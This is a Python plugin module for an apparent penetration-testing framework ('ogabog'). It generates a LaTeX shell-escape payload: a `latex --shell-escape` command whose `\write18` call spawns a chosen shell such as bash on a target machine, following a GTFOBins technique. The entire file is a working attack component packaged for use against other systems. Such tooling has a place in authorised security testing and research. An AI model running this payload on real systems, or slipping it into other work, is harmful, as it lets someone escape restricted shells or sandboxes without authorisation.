from ogabog.cores import plugin, const


class PTY(plugin.Module):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.opts.description = "[PTYShell] Latext PTY shell escape. https://gtfobins.github.io/gtfobins/latex/"
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
        self.shell_type = "pty"

    def make_shell(self):
        self.shell = "latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{"
        self.shell += self.args.shell
        self.shell += "}\\end{document}'"
